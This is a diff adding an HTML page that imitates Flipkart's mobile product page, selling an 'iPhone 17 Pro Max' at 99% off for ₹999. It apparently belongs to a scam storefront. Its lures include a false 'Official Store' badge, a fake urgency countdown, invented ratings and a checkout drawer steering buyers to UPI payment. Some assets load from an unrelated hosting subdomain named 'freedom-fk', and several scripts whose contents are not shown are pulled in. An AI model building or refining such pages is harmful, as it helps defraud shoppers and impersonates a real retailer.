@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Apple iPhone 17 Pro Max (Cosmic Orange, 256 GB) - Flipkart</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="product.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%232874f0'/><text x='50%25' y='68%25' font-size='20' font-weight='bold' font-family='sans-serif' fill='%23ffe11b' text-anchor='middle'>f</text></svg>">
+  <link rel="stylesheet" href="/assets/flipkart-splash.css">
+  <script src="/assets/flipkart-splash.js"></script>
+  <script src="/assets/security-shield.js"></script>
+  <style>
+    /* Checkout Drawer Styles */
+    .checkout-modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 100000;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.25s ease;
+    }
+    .checkout-modal-overlay.open {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .checkout-drawer {
+      background: #ffffff;
+      border-radius: 16px 16px 0 0;
+      padding: 16px;
+      max-height: 85vh;
+      overflow-y: auto;
+      transform: translateY(100%);
+      transition: transform 0.3s cubic-bezier(0.2, 0.9, 0.3, 1);
+      max-width: 480px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    .checkout-modal-overlay.open .checkout-drawer {
+      transform: translateY(0);
+    }
+    .drawer-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #f0f0f0;
+      padding-bottom: 12px;
+      margin-bottom: 12px;
+    }
+    .drawer-header h3 {
+      font-size: 16px;
+      font-weight: 700;
+      color: #212121;
+    }
+    .close-drawer-btn {
+      background: none;
+      border: none;
+      font-size: 22px;
+      color: #717478;
+      cursor: pointer;
+    }
+    .drawer-product-summary {
+      display: flex;
+      gap: 12px;
+      padding-bottom: 14px;
+      border-bottom: 1px solid #f0f0f0;
+      margin-bottom: 14px;
+    }
+    .drawer-product-summary img {
+      width: 60px;
+      height: 60px;
+      object-fit: contain;
+      border-radius: 6px;
+      border: 1px solid #eee;
+    }
+    .drawer-product-info {
+      flex: 1;
+    }
+    .drawer-product-title {
+      font-size: 13px;
+      font-weight: 500;
+      line-height: 1.35;
+      margin-bottom: 4px;
+      color: #212121;
+    }
+    .drawer-product-prices {
+      display: flex;
+      align-items: baseline;
+      gap: 8px;
+    }
+    .drawer-price {
+      font-size: 16px;
+      font-weight: 700;
+      color: #212121;
+    }
+    .drawer-mrp {
+      font-size: 13px;
+      color: #878787;
+      text-decoration: line-through;
+    }
+    .pay-methods-title {
+      font-size: 14px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      color: #212121;
+    }
+    .pay-options-list {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+    .pay-option {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 12px;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.15s ease;
+    }
+    .pay-option.active {
+      border-color: #2874f0;
+      background: #f0f7ff;
+    }
+    .pay-option-icon {
+      font-size: 18px;
+    }
+    .pay-option-details {
+      flex: 1;
+    }
+    .pay-option-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: #212121;
+    }
+    .pay-option-sub {
+      font-size: 11px;
+      color: #878787;
+    }
+    .drawer-total-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 0;
+      border-top: 1px solid #f0f0f0;
+      font-size: 15px;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+    .confirm-order-btn {
+      width: 100%;
+      height: 48px;
+      background: #fb641b;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    .confirm-order-btn:active {
+      background: #e65100;
+    }
+    /* Success Overlay */
+    .order-success-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 1000000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.25s ease;
+    }
+    .order-success-overlay.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .success-card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 24px;
+      text-align: center;
+      max-width: 360px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    }
+    .success-icon-wrap {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: #22c55e;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px auto;
+      font-size: 32px;
+    }
+    .success-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #212121;
+      margin-bottom: 8px;
+    }
+    .success-sub {
+      font-size: 13px;
+      color: #555;
+      line-height: 1.4;
+      margin-bottom: 20px;
+    }
+    .success-btn {
+      width: 100%;
+      height: 44px;
+      background: #2874f0;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Mobile Viewport Container -->
+  <div class="product-viewport">
+
+    <!-- 1. FIXED TOP HEADER (Matching Screenshot 1) -->
+    <header class="p-header">
+      <div class="header-left">
+        <!-- Back Arrow -->
+        <button class="back-btn" onclick="window.history.length > 1 ? window.history.back() : window.location.href='index.html'" aria-label="Go Back">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="19" y1="12" x2="5" y2="12"></line>
+            <polyline points="12 19 5 12 12 5"></polyline>
+          </svg>
+        </button>
+
+        <!-- Flipkart Yellow Circle Logo with Blue 'f' -->
+        <a href="index.html" class="header-logo" title="Flipkart Home">
+          <div class="fk-circle-logo">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+              <!-- Iconic Flipkart blue 'f' with italic tilt -->
+              <path d="M16 4h-3.2c-2.4 0-4 1.5-4 4.2v2.8H6.5v3.2h2.3v7.8h3.8v-7.8h3.4l.5-3.2h-3.9V8.6c0-.8.4-1.4 1.4-1.4H16V4z" fill="#2874f0"/>
+            </svg>
+          </div>
+        </a>
+      </div>
+
+      <div class="header-right">
+        <!-- Search Icon -->
+        <a href="index.html" class="header-icon-btn" aria-label="Search">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#212121" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8"></circle>
+            <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+          </svg>
+        </a>
+
+        <!-- Cart Icon with Badge -->
+        <button class="header-icon-btn" onclick="buyNowAction()" aria-label="Shopping Cart">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#212121" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="9" cy="21" r="1"></circle>
+            <circle cx="20" cy="21" r="1"></circle>
+            <path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path>
+          </svg>
+          <span class="header-cart-badge">1</span>
+        </button>
+
+        <!-- User / Account Icon -->
+        <a href="#" class="header-icon-btn" aria-label="Account">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#212121" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+            <circle cx="12" cy="7" r="4"></circle>
+          </svg>
+        </a>
+      </div>
+    </header>
+
+    <!-- 2. PRODUCT IMAGE ALBUM SLIDER / CAROUSEL (Matching Screenshot 1) -->
+    <section class="gallery-section">
+      <!-- Heart Wishlist Floating Button -->
+      <button class="floating-action-btn love-btn" id="heartBtn" aria-label="Add to Wishlist">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+          <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" stroke="#717478" stroke-width="1.8" fill="#ffffff"/>
+        </svg>
+      </button>
+
+      <!-- Share Floating Button -->
+      <button class="floating-action-btn share-btn" id="shareBtn" aria-label="Share Product">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+          <path d="M14 9V5L21 12L14 19V15C9 15 5.5 16.5 3 20C4 15 7 10 14 9Z" stroke="#717478" stroke-width="1.8" fill="#ffffff" stroke-linejoin="round"/>
+        </svg>
+      </button>
+
+      <!-- Carousel Viewport & Track -->
+      <div class="carousel-viewport" id="carouselViewport">
+        <div class="carousel-track" id="carouselTrack">
+          <!-- Slide 1 (Hero shot matching screenshot 1 with tagline) -->
+          <div class="carousel-slide">
+            <img src="assets/images/iphone17/hero.jpg" alt="Apple iPhone 17 Pro Max Cosmic Orange" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/f/v/m/-original-imahft6chnx2vbuy.jpeg?q=90'">
+          </div>
+          <!-- Slide 2 -->
+          <div class="carousel-slide">
+            <img src="assets/images/iphone17/back.jpg" alt="Apple iPhone 17 Pro Max Back View" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/m/n/c/-original-imahft6c3rbjysmg.jpeg?q=90'">
+          </div>
+          <!-- Slide 3 -->
+          <div class="carousel-slide">
+            <img src="assets/images/iphone17/camera.jpg" alt="Apple iPhone 17 Pro Max Camera Zoom" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/t/1/p/-original-imahft6cag2fggja.jpeg?q=90'">
+          </div>
+          <!-- Slide 4 -->
+          <div class="carousel-slide">
+            <img src="assets/images/iphone17/front.jpg" alt="Apple iPhone 17 Pro Max Front Display" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/x/c/q/-original-imahft5njwbfyz5u.jpeg?q=90'">
+          </div>
+          <!-- Slide 5 -->
+          <div class="carousel-slide">
+            <img src="assets/images/iphone17/side.jpg" alt="Apple iPhone 17 Pro Max Titanium Side" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/z/v/8/-original-imahft6cjegrw5sj.jpeg?q=90'">
+          </div>
+          <!-- Slide 6 -->
+          <div class="carousel-slide">
+            <img src="assets/images/iphone17/box.jpg" alt="Apple iPhone 17 Pro Max Box Accessories" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/p/o/c/-original-imahft5nzmgz2agc.jpeg?q=90'">
+          </div>
+        </div>
+      </div>
+
+      <!-- Carousel Indicator Dots -->
+      <div class="carousel-dots" id="carouselDots">
+        <div class="carousel-dot active"></div>
+        <div class="carousel-dot"></div>
+        <div class="carousel-dot"></div>
+        <div class="carousel-dot"></div>
+        <div class="carousel-dot"></div>
+        <div class="carousel-dot"></div>
+      </div>
+    </section>
+
+    <!-- 3. TITLE, RATING & PRICING BLOCK (Matching Screenshot 1) -->
+    <section class="product-info-card">
+      
+      <!-- Official Brand Logo Strip -->
+      <div class="product-brand-header" id="productBrandHeader">
+        <div class="brand-badge-pill" id="brandBadgePill">
+          <span class="brand-svg-logo" id="brandSvgLogo"></span>
+          <span class="brand-title-name" id="brandTitleName">Apple</span>
+        </div>
+        <span class="official-store-badge"><i class="bi bi-shield-fill-check"></i> Official Store</span>
+      </div>
+
+      <h1 class="product-title" id="productTitle">Apple iPhone 17 Pro Max (Cosmic Orange, 256 GB)</h1>
+
+      <div class="rating-row">
+        <div class="rating-badge">
+          <span id="ratingVal">4.6</span>
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="#ffffff">
+            <path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/>
+          </svg>
+        </div>
+        <span class="rating-text" id="reviewsCountVal">500 Ratings & Reviews</span>
+        <img src="assets/images/fk_assured.png" alt="Flipkart Assured" class="fk-assured-logo" onerror="this.src='https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png'">
+      </div>
+
+      <div class="pricing-row">
+        <span class="discount-val" id="discountVal">99% off</span>
+        <span class="mrp-val" id="mrpVal">₹1,47,900</span>
+        <span class="selling-price-val" id="sellingPriceVal">₹999</span>
+      </div>
+
+      <!-- Color Variants Block -->
+      <div class="variants-block" id="colorVariantsBlock" style="display: none;">
+        <div class="variant-label-row">
+          <span class="v-label">Color:</span>
+          <strong class="v-selected" id="selectedColorName">Cosmic Orange</strong>
+        </div>
+        <div class="color-swatches-row" id="colorSwatchesRow"></div>
+      </div>
+
+      <!-- Size Selection Block (Shoes / Footwear / Clothes) -->
+      <div class="variants-block" id="sizeVariantsBlock" style="display: none;">
+        <div class="variant-label-row">
+          <span class="v-label">Size:</span>
+          <strong class="v-selected" id="selectedSizeName">7</strong>
+        </div>
+        <div class="chips-row" id="sizeChipsRow"></div>
+      </div>
+
+      <!-- RAM Selection Block -->
+      <div class="variants-block" id="ramVariantsBlock" style="display: none;">
+        <div class="variant-label-row">
+          <span class="v-label">RAM:</span>
+          <strong class="v-selected" id="selectedRamName">6 GB</strong>
+        </div>
+        <div class="chips-row" id="ramChipsRow"></div>
+      </div>
+
+      <!-- Storage Selection Block -->
+      <div class="variants-block" id="storageVariantsBlock" style="display: none;">
+        <div class="variant-label-row">
+          <span class="v-label">Storage:</span>
+          <strong class="v-selected" id="selectedStorageName">128 GB</strong>
+        </div>
+        <div class="chips-row" id="storageChipsRow"></div>
+      </div>
+
+      <div class="packaging-fee">+ <del style="color:#878787;">₹99</del> Secured Packaging Free</div>
+      <div class="delivery-estimate">Free delivery by <strong>2 Days</strong></div>
+    </section>
+
+    <!-- 4. DELIVERY BANNER CARD (Matching Screenshot 1) -->
+    <section class="delivery-card">
+      <div class="delivery-truck-icon">
+        <!-- Crisp Flipkart Express Delivery Truck SVG -->
+        <svg viewBox="0 0 48 48" fill="none">
+          <rect x="4" y="14" width="26" height="20" rx="3" fill="#2874f0"/>
+          <path d="M30 18h8l6 8v8h-14V18z" fill="#3b82f6"/>
+          <rect x="33" y="21" width="6" height="5" rx="1" fill="#ffffff" opacity="0.8"/>
+          <circle cx="13" cy="35" r="5" fill="#1e293b"/>
+          <circle cx="13" cy="35" r="2.5" fill="#94a3b8"/>
+          <circle cx="37" cy="35" r="5" fill="#1e293b"/>
+          <circle cx="37" cy="35" r="2.5" fill="#94a3b8"/>
+          <path d="M9 22h8M7 26h12" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <div class="delivery-details">
+        <p class="delivery-title">
+          <span class="bold-express">Express</span> <span class="free-green">Free</span> <del class="mrp-struck">₹40</del> Delivery
+        </p>
+        <p class="delivery-date-line">
+          Delivery by <strong id="deliveryDateText">Mon, Oct 12</strong>
+        </p>
+        <p class="delivery-timer-line">
+          Offer ends in <span class="countdown-highlight" id="offerTimer">14m 54s</span>
+        </p>
+      </div>
+    </section>
+
+    <!-- 5. WOW DEAL CARD (Matching Screenshot 1) -->
+    <section class="wow-deal-card">
+      <img src="assets/images/wow-deal.png" alt="WOW! DEAL" class="wow-logo-img" onerror="this.src='https://i.ibb.co/4MtgWPp/Wow-Deal300ppi.png'">
+      <div class="wow-content">
+        <div class="wow-price-line">
+          <span>Get at</span>
+          <span class="wow-green-price" id="wowPriceVal">₹999</span>
+        </div>
+        <div class="wow-subtitle">With UPI Payment & More</div>
+      </div>
+    </section>
+
+    <!-- 6. 1 YEAR BRAND WARRANTY CARD (Matching Screenshot 1) -->
+    <section class="warranty-card">
+      <div class="warranty-header">
+        <span class="warranty-tag-icon">
+          <!-- Green Tag Icon -->
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M21.41 11.58l-9-9C12.05 2.22 11.55 2 11 2H4c-1.1 0-2 .9-2 2v7c0 .55.22 1.05.59 1.42l9 9c.36.36.86.58 1.41.58.55 0 1.05-.22 1.41-.59l7-7c.37-.36.59-.86.59-1.41 0-.55-.23-1.06-.59-1.42zM5.5 7C4.67 7 4 6.33 4 5.5S4.67 4 5.5 4 7 4.67 7 5.5 6.33 7 5.5 7z"/>
+          </svg>
+        </span>
+        <span class="warranty-title-text">1 YEAR BRAND WARRANTY</span>
+      </div>
+
+      <!-- Trust & Warranty Shield Banner -->
+      <div class="warranty-banner-wrap" id="warrantyBannerWrap">
+        <div class="warranty-shield-badge" id="warrantyShieldBadge">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+          </svg>
+        </div>
+        <div class="warranty-banner-info">
+          <div class="warranty-banner-headline" id="warrantyBannerHeadline">Apple Official 1-Year Limited Warranty</div>
+          <div class="warranty-banner-sub" id="warrantyBannerSub">100% Genuine Apple product with 7 Days Replacement Guarantee and free doorstep pickup.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 7. HIGHLIGHTS SECTION -->
+    <section class="detail-section" id="highlightsContainer">
+      <h2 class="detail-heading">Highlights</h2>
+      <ul class="highlights-list" id="highlightsList">
+        <li>256 GB ROM | Super Retina XDR OLED Display</li>
+        <li>17.53 cm (6.9 inch) ProMotion 120Hz Always-On Display</li>
+        <li>48MP + 48MP + 48MP Pro Triple Camera System | 12MP TrueDepth Front</li>
+        <li>A19 Pro Bionic Chip with 6-Core GPU & Neural Accelerator</li>
+        <li>Aerospace-Grade Titanium Enclosure with Ceramic Shield Gen 3</li>
+        <li>1 Year Manufacturer Warranty on Phone & 6 Months on Accessories</li>
+      </ul>
+    </section>
+
+    <!-- 8. SPECIFICATIONS SECTION -->
+    <section class="detail-section">
+      <h2 class="detail-heading">Specifications</h2>
+      <table class="spec-table" id="specTable">
+        <!-- Populated dynamically via product.js -->
+      </table>
+    </section>
+
+    <!-- 9. SIMILAR PRODUCTS SECTION (Matching Screenshot 3) -->
+    <section class="similar-section">
+      <h2 class="detail-heading" style="padding-left: 0; margin-left: 0;">Similar Products</h2>
+      <div class="similar-scroll" id="similarScroll">
+        <!-- Rendered dynamically by product.js with boAt Stone 352, GOBOULT Mustang Racer, boAt Airdopes, etc. -->
+      </div>
+    </section>
+
+    <!-- 10. PRODUCT DESCRIPTION SECTION -->
+    <section class="detail-section">
+      <h2 class="detail-heading">Product Description</h2>
+      <div class="description-images-box" id="descImagesBox">
+        <img src="assets/images/iphone17/camera.jpg" alt="Apple Camera Innovation" loading="lazy">
+        <img src="assets/images/iphone17/back.jpg" alt="Cosmic Orange Titanium Finish" loading="lazy">
+        <img src="assets/images/iphone17/front.jpg" alt="Dynamic Island and Super Retina Display" loading="lazy">
+      </div>
+    </section>
+
+    <!-- 11. RATINGS & REVIEWS SECTION -->
+    <section class="detail-section">
+      <h2 class="detail-heading">Ratings & Reviews</h2>
+      <div id="reviewsList">
+        <!-- Reviews populated by product.js -->
+      </div>
+    </section>
+
+    <!-- 12. FOOTER (Matching Screenshot 2) -->
+    <footer class="p-footer">
+      <div class="footer-nav-links">
+        <a href="#">Become a Seller</a>
+        <a href="#">Advertise</a>
+        <a href="#">Help Center</a>
+      </div>
+      <div class="footer-copyright">
+        © 2007–2026 <strong>Flipkart.com</strong>
+      </div>
+      <div class="footer-payment-strip">
+        <img src="assets/images/payment-methods.svg" alt="Visa, MasterCard, RuPay, NetBanking, COD" onerror="this.src='https://mediumseagreen-quetzal-932356.hostingersite.com/freedom-fk/products/payment-method_69e7ec.svg'">
+      </div>
+    </footer>
+
+    <!-- 13. FIXED BOTTOM FLOATING BUTTONS (Matching Screenshot 1 & 2) -->
+    <div class="floating-bar">
+      <!-- Add to Cart (Outlined Blue) -->
+      <button class="btn-cart" onclick="addToCartAction()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+          <circle cx="9" cy="21" r="1"></circle>
+          <circle cx="20" cy="21" r="1"></circle>
+          <path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path>
+        </svg>
+        <span>Add to Cart</span>
+      </button>
+
+      <!-- Buy Now (Golden Yellow Filled) -->
+      <button class="btn-buy" onclick="buyNowAction()">
+        <span>Buy Now</span>
+      </button>
+    </div>
+
+  </div> <!-- End .product-viewport -->
+
+  <!-- Lightbox Modal for Customer Photo Zoom -->
+  <div class="lightbox-overlay" id="lightboxOverlay">
+    <div class="lightbox-close" id="lightboxClose">&times;</div>
+    <img src="" alt="Customer Photo Zoom" class="lightbox-img" id="lightboxImg">
+  </div>
+
+  <!-- Toast Notification Message -->
+  <div class="toast-msg" id="toastMsg">Notification</div>
+
+  <!-- CHECKOUT DRAWER MODAL -->
+  <div class="checkout-modal-overlay" id="checkoutDrawer">
+    <div class="checkout-drawer">
+      <div class="drawer-header">
+        <h3>Complete Your Order</h3>
+        <button class="close-drawer-btn" id="closeDrawerBtn">&times;</button>
+      </div>
+
+      <div class="drawer-product-summary">
+        <img src="assets/images/iphone17/hero.jpg" id="drawerThumb" alt="Product">
+        <div class="drawer-product-info">
+          <div class="drawer-product-title" id="drawerTitle">Apple iPhone 17 Pro Max (Cosmic Orange, 256 GB)</div>
+          <div class="drawer-product-prices">
+            <span class="drawer-price" id="drawerPrice">₹999</span>
+            <span class="drawer-mrp" id="drawerMrp">₹1,47,900</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="pay-methods-title">Select Payment Mode</div>
+      <div class="pay-options-list">
+        <div class="pay-option active">
+          <span class="pay-option-icon">⚡</span>
+          <div class="pay-option-details">
+            <div class="pay-option-name">UPI / Google Pay / PhonePe / Paytm</div>
+            <div class="pay-option-sub">Fast & Secured Instant Checkout</div>
+          </div>
+        </div>
+        <div class="pay-option">
+          <span class="pay-option-icon">💳</span>
+          <div class="pay-option-details">
+            <div class="pay-option-name">Credit / Debit / ATM Card</div>
+            <div class="pay-option-sub">All Visa, Mastercard, RuPay cards accepted</div>
+          </div>
+        </div>
+        <div class="pay-option">
+          <span class="pay-option-icon">💵</span>
+          <div class="pay-option-details">
+            <div class="pay-option-name">Cash on Delivery (COD)</div>
+            <div class="pay-option-sub">Pay cash upon delivery at your doorstep</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="drawer-total-row">
+        <span>Total Payable:</span>
+        <span id="drawerTotal" style="color: #2e7d32;">₹999</span>
+      </div>
+
+      <button class="confirm-order-btn" id="drawerConfirmBtn">Continue to Pay</button>
+    </div>
+  </div>
+
+  <!-- ORDER SUCCESS OVERLAY -->
+  <div class="order-success-overlay" id="orderSuccessOverlay">
+    <div class="success-card">
+      <div class="success-icon-wrap">✓</div>
+      <div class="success-title">Order Confirmed!</div>
+      <div class="success-sub">Thank you for shopping on Flipkart. Your Apple iPhone 17 Pro Max will be delivered within 2 days with Express Free delivery.</div>
+      <button class="success-btn" id="orderDoneBtn">Back to Home</button>
+    </div>
+  </div>
+
+  <script src="/assets/RemoteStore.js"></script>
+  <script src="/assets/tracker.js"></script>
+  <script src="product.js"></script>
+</body>
+</html>
